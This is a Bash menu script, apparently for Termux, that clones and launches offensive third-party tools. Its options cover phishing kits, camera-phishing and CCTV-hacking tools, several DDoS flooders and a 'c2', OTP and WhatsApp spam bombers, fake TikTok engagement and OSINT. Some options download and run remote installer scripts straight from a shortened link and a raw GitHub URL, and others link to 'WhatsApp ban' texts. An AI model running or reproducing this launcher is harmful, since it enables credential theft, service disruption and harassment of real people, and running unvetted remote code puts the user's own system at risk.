#cyber senyap
#gak usah reacord

RED="\e[31m"
GREEN="\e[32m"
ITALICRED="\e[3;${RED}m"

clear

echo -e " ${RED}██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗  ██╗░░░██╗░░███╗░░"
echo -e " ██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝  ██║░░░██║░████║░░"
echo -e " ██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░  ╚██╗░██╔╝██╔██║░░"
echo -e " ██╔══██╗██║░░░░░██╔══██║██║░░██╗██╔═██╗░  ░╚████╔╝░╚═╝██║░░"
echo -e " ██████╦╝███████╗██║░░██║╚█████╔╝██║░╚██╗  ░░╚██╔╝░░███████╗"
echo -e " ╚═════╝░╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝  ░░░╚═╝░░░╚══════╝"
echo

echo -e " ${GREEN}███████████████████████████████████████████████████"
echo    " ██                                               ██"
echo -e " ██ 1.CRACK PHISER 01                             ██"
echo    " ██                                               ██"
echo -e " ██ 2.CRACK PHISER 02                             ██"
echo    " ██                                               ██"
echo -e " ██ 3.CRACK PHISER 03                             ██"
echo    " ██                                               ██"
echo -e " ██ 4.CAMPHISING                                  ██"
echo    " ██                                               ██"
echo -e " ██ 5.HACK-CCTV                                   ██"
echo    " ██                                               ██"
echo -e " ██ 6.DOS 01                                      ██"
echo    " ██                                               ██"
echo -e " ██ 7.DOS 02                                      ██"
echo    " ██                                               ██"
echo -e " ██ 8.DOS 03                                      ██"
echo    " ██                                               ██"
echo -e " ██ 9.DOS 04                                      ██"
echo    " ██                                               ██"
echo -e " ██ 10.SPAM OTP 01                                ██"
echo    " ██                                               ██"
echo -e " ██ 11.SPAM OTP 02                                ██"
echo    " ██                                               ██"
echo -e " ██ 12.SPAM OTP 03                                ██"
echo    " ██                                               ██"
echo -e " ██ 13.SPAM OTP 04                                ██"
echo    " ██                                               ██"
echo -e " ██ 14.SPAM OTP 05                                ██"
echo    " ██                                               ██"
echo -e " ██ 15.FOLLOWERS TIK TOK                          ██"
echo    " ██                                               ██"
echo -e " ██ 16.VIEWR TIK TOK                              ██"
echo    " ██                                               ██"
echo -e " ██ 17.OSINT                                      ██"
echo    " ██                                               ██"
echo -e " ██ 18.TAMPILAN TERMUX                            ██"
echo    " ██                                               ██"
echo -e " ██ 19.NETHUNTER DEKSTOP FULL                     ██"
echo    " ██                                               ██"
echo -e " ██ 20.NETHUNTER DEKSTOP MINIMAL                  ██"
echo    " ██                                               ██"
echo -e " ██ 21.TUTORIAL INSTALL DEBIAN                    ██"
echo    " ██                                               ██"
echo -e " ██ 22.TEXS BANED WA                              ██"
echo    " ██                                               ██"
echo -e " ██ 23.TEXS UNBANED WA                            ██"
echo    " ██                                               ██"
echo -e " ██ 24.FOLLOW TIK TOK                             ██"
echo    " ██                                               ██"
echo -e " ██ 25.SUSCRIBE YOUTUBE                           ██"
echo    " ██                                               ██"
echo    " ███████████████████████████████████████████████████"
echo
echo
read -p "PILIH MENU:" HOOH
#CRACK PHISER 01
if [ $HOOH == 1 ]
   then
   clear
   sleep 1
 git clone --depth=1 https://github.com/htr-tech/zphisher.git
 cd zphisher
 bash zphisher.sh
fi

#CRACK PHISER 02
if [ $HOOH == 2 ]
   then
   clear
   sleep 1
apt-get update -y

apt-get install php -y

apt-get install openssh -y 

apt-get install wget -y

apt-get install git -y

git clone https://github.com/Black-Hell-Team/LordPhish.git

cd LordPhish

bash setup.sh 

bash lord.sh
fi

#CRACK PHISER 03
if [ $HOOH == 3 ]
   then
   clear
   sleep 1
apt update && apt upgrade -y && apt install git wget php unzip curl -y && git clone https://github.com/AbirHasan2005/ShellPhish && cd ShellPhish && chmod +x * && bash shellphish.sh
cd ShellPhish
bash update.sh
fi

#CAMPHISING
if [ $HOOH == 4 ]
   then
   clear
   sleep 1
apt update && apt upgrade -y
apt install git -y
apt install php
apt install curl -y
apt install wget -y
git clone https://github.com/XPH4N70M/HACK-CAMERA.git
cd HACK-CAMERA
bash setup
bash hack_camera.sh
fi

#HACK-CCTV
if [ $HOOH == 5 ]
   then
   clear
   sleep 1
 apt-get install python3
 apt-get install git
 git clone https://github.com/Whomrx666/Hack-cctv
 cd Hack-cctv
 pip install -r requirements.txt
 python3 Hack-cctv.py 
fi

#DOS 01
if [ $HOOH == 6 ]
   then
   clear
   sleep 1
 apt update -y && apt upgrade -y
 pkg install git
 pkg install python
 pkg install python2
 git clone https://github.com/Whomrx666/Ddos-layer7.git
 cd Ddos-layer7
 python2 Ddos-layer7.py
fi

#DOS 02
if [ $HOOH == 7 ]
   then
   clear
   sleep 1
 pkg install curl
 pkg install python3
 pkg install git
 git clone https://github.com/Whomrx666/anonymous-c2
 cd anonymous-c2
 pip install -r requirements.txt
 python -m pip install cloudscraper
 python -m pip install scapy
 python3 anonymous-c2.py
fi

#DOS 03
if [ $HOOH == 8 ]
   then
   clear
   sleep 1
 pkg update && pkg upgrade
 pkg install python
 pkg install python3
 pkg install git
 git clone https://github.com/Whomrx666/flood-ddos.git
 cd flood-ddos
 python flood-ddos.py
fi

#DOS 04
if [ $HOOH == 9 ]
    then
    clear
    sleep 1
apt update
 apt upgrade
 apt install python
 apt install git
 apt install dnsutils
 git clone https://github.com/Pavithran-R/Hammer/
cd Hammer
python hammer.py
fi

#SPAM OTP 01
if [ $HOOH == 10 ]
   then
   clear
   sleep 1
pkg install python
pkg install python2
pkg install python3
pkg install git
git clone https://github.com/VEGERNOM/Spam
cd Spam
python2 spam_simpel.py
fi

#SPAM OTP 02
if [ $HOOH == 11 ]
   then
   clear
   sleep 1
apt upgrade && apt update
 apt install git
 git clone https://github.com/mrmsdv/sdvspam.git
 cd sdvspam
 sh install.sh
 sh sdv.sh
fi

#SPAM OTP 03
if [ $HOOH == 12 ]
   then
   clear
   sleep 1
pkg install git
 pkg install php
git clone https://github.com/ac10ac10/bomwhatsapp.git
ls
cd bomwhatsapp
ls
php whatsapp.php
fi

#SPAM OTP 04
if [ $HOOH == 13 ]
   then
   clear
   sleep 1
git clone https://github.com/rickyfazaa/MySPAMBot-OTP
cd MySPAMBot-OTP
python main.py
fi

#SPAM OTP 05
if [ $HOOH == 14 ]
   then
   clear
   sleep 1
 apt upgrade && apt update
 pkg update
 pkg install python2
 git clone https://github.com/AbilSeno/WaUnlimitedV3
 cd WaUnlimitedV3
 pip2 install requests
 python2 spam.py
fi

#FOLLOWERS TIK TOK
if [ $HOOH == 15 ]
   then
   clear
   sleep 1
apt update -y && apt upgrade -y
pkg install git python-pip
git clone https://github.com/RozhakXD/PubTok
cd PubTok
python -m pip install -r requirements.txt
uname -m
chmod +x aarch64
./aarch64
fi

#VIWERS TIK TOK
if [ $HOOH == 16 ]
   then
   clear
   sleep 1
xdg-open "https://zefoy.com/"
fi

#OSINT
if [ $HOOH == 17 ]
   then
   clear
   sleep 1
 pkg update -y && pkg upgrade -y
 apt update -y && apt upgrade -y
 pkg install python -y
 pkg install git
 git clone https://github.com/Whomrx666/osint-X.git
 cd osint-X
 bash module.sh
 python osint-X.py
fi

#TAMPILAN TERMUX
if [ $HOOH == 18 ]
   then
   clear
   sleep 1
 apt install python2 -y
 apt install git -y
 git clone https://github.com/4NK3R-PRODUCT1ON/T4MPILAN-V5
 cd T4MPILAN-V5
 python2 style5.py
fi

#NETHUNTER FULL
if [ $HOOH == 19 ]
   then
   clear
   sleep 1
pkg install wget -y ; wget -O install-nethunter-termux https://offs.ec/2MceZWr ; chmod +x install-nethunter-termux ; ./install-nethunter-termux
fi

#NETHUNTER MINIMAL
if [ $HOOH == 20 ]
   then
   clear
   sleep 1
pkg install root-repo && pkg install x11-repo && apt update && apt upgrade -y && apt update && apt install wget -y && apt update && wget https://raw.githubusercontent.com/shahinuralamin/Technical_Shahinur_Al-Amin/main/install-nethunter-modified 
chmod +x install-nethunter-modified
./install-nethunter-modified
fi

#TUTORIAL INSTALL DEBIAN
if [ $HOOH == 21 ]
   then
   sleep 1
xdg-open "https://drive.google.com/file/d/14gt1p34RtEynXGFd7j74tIAMJfournD4/view?usp=drivesdk"
fi

#TEXS BANED WA
if [ $HOOH == 22 ]
  then
  clear
  sleep 1
xdg-open "https://drive.google.com/file/d/14V4fCRYv-TpRKfc1Olg2I6jcB8Q1QPiP/view?usp=drivesdk"
fi

#TEXS UNBANED WA
if [ $HOOH == 23 ]
  then
  clear
  sleep 1
xdg-open "https://drive.google.com/file/d/14V3b11fDLTNzddSKTdVZiNlDwK7JBTjD/view?usp=drivesdk"
fi

#FOLLOW TIK TOK
if [ $HOOH == 24 ]
then
clear
sleep 1
xdg-open "https://www.tiktok.com/@king_hooh777"
fi

#SUSCRIBE YOUTUBE
if [ $HOOH == 25 ]
then
clear
sleep 1
xdg-open "https://www.youtube.com/@MR_HOOH"
fi
